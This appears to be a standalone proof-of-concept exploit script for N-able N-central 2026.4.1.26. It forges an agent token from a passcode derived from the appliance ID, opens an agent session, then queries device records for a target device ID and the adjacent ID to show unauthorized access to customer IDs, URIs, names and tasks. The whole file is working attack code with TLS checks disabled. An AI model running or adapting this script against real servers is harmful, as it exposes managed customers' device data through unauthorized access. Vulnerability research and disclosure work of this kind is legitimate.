#!/usr/bin/env python3
import argparse
import base64
import hashlib
import html
import json
import os
import secrets
import xml.etree.ElementTree as ET

import requests
import urllib3


SOAP11 = "http://schemas.xmlsoap.org/soap/envelope/"
SOAP12 = "http://www.w3.org/2003/05/soap-envelope"
MMS3 = "http://mms3.nobj.nable.com/"
MICKEY = "http://www.n-able.com/mickey"


def value(raw, name):
    try:
        return next(
            (
                (node.text or "").strip()
                for node in ET.fromstring(raw).iter()
                if node.tag.rsplit("}", 1)[-1].lower() == name.lower() and node.text
            ),
            "",
        )
    except ET.ParseError:
        return ""


def jwt_id(token):
    part = token.split(".")[1]
    part += "=" * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(part))["jti"]


def query_body(session, device_id):
    return (
        f'<soap:Envelope xmlns:soap="{SOAP11}" xmlns:soapenc="{SOAP11}encoding/" '
        f'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
        f'xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:m="{MICKEY}">'
        f'<soap:Body><m:Device.GetAdv soap:encodingStyle="{SOAP11}encoding/">'
        f'<SessionID xsi:type="xsd:int">{session}</SessionID>'
        '<DeviceIDs xsi:type="m:ArrayOf_xsd_int" soapenc:arrayType="xsd:int[1]">'
        f'<item xsi:type="xsd:int">{device_id}</item></DeviceIDs>'
        '<OrderBy xsi:type="xsd:string">deviceid</OrderBy>'
        '<ReverseOrder xsi:type="xsd:boolean">false</ReverseOrder>'
        '<Offset xsi:type="xsd:int">0</Offset><Limit xsi:type="xsd:int">2</Limit>'
        '</m:Device.GetAdv></soap:Body></soap:Envelope>'
    )


def parse_device(raw):
    fields = {}
    tasks = []
    for node in ET.fromstring(raw).iter():
        name = node.tag.rsplit("}", 1)[-1]
        if name in {"DeviceID", "CustomerID", "URI", "LongName", "SourceURI", "Description"} and node.text:
            fields.setdefault(name, node.text.strip())
        if name == "Tasks" and node.text:
            tasks.append(node.text.strip())
    return fields, tasks


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="https://n-central.local")
    parser.add_argument("--appliance-id", type=int, required=True)
    parser.add_argument("--device-id", type=int, required=True)
    args = parser.parse_args()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    http = requests.Session()
    http.verify = False
    origin = args.target.rstrip("/")
    mms_url = origin + "/dms2/services2/ServerMMS3"
    ui_url = origin + "/dms/services/ServerUI"
    hardware = os.getenv("NCENTRAL_HARDWARE_ID") or ("devicegetadv-" + secrets.token_hex(6))

    def mms(inner, token=None, session=None):
        headers = {"Content-Type": "application/soap+xml; charset=UTF-8"}
        if token:
            headers["Authorization"] = "Bearer " + token
        if session:
            headers["X-Session-Id"] = str(session)
        body = f'<s:Envelope xmlns:s="{SOAP12}" xmlns:m="{MMS3}"><s:Body>{inner}</s:Body></s:Envelope>'
        return http.post(
            mms_url,
            data=body,
            headers=headers,
            timeout=45,
        )

    appliance = str(args.appliance_id)
    acquired = mms(
        f'<m:AcquireToken><m:applianceId>{appliance}</m:applianceId>'
        f'<m:passcode>{hashlib.sha256(appliance.encode()).hexdigest()}</m:passcode>'
        f'<m:hardwareId>{hardware}</m:hardwareId></m:AcquireToken>'
    )
    token = value(acquired.content, "return")
    if acquired.status_code != 200 or not token:
        raise RuntimeError("token acquisition failed")
    mms(f'<m:ConfirmTokenReceived><m:jwtId>{jwt_id(token)}</m:jwtId></m:ConfirmTokenReceived>').raise_for_status()
    hello = mms(
        '<m:SessionHello><m:version>2.0.0</m:version>'
        '<m:applianceVersion>2026.4.1.26</m:applianceVersion>'
        '<m:agent_OSID>winnt</m:agent_OSID><m:agent_OS>Windows</m:agent_OS>'
        '<m:timeZoneID>-05:00</m:timeZoneID></m:SessionHello>',
        token,
    )
    session = value(hello.content, "return")
    if hello.status_code != 200 or not session.isdigit():
        raise RuntimeError("session creation failed")

    def query(device_id):
        return http.post(
            ui_url,
            data=query_body(session, device_id),
            headers={"Content-Type": "text/xml; charset=UTF-8", "SOAPAction": '""'},
            timeout=45,
        )

    exact = query(args.device_id)
    adjacent = query(args.device_id + 1)
    fields, tasks = parse_device(exact.content)
    print("build=N-able N-central 2026.4.1.26")
    print(f"exact_http={exact.status_code} exact_count={value(exact.content, 'Count') or 0}")
    print(f"device_id={fields.get('DeviceID', '')}")
    print(f"customer_id={fields.get('CustomerID', '')}")
    print(f"uri={fields.get('URI', '')}")
    print(f"name={fields.get('LongName', '')}")
    print("tasks=" + ",".join(tasks))
    print(f"adjacent_http={adjacent.status_code} adjacent_count={value(adjacent.content, 'Count') or 0}")
    mms('<m:SessionQuit><m:shutdown>false</m:shutdown></m:SessionQuit>', token, session)


if __name__ == "__main__":
    main()
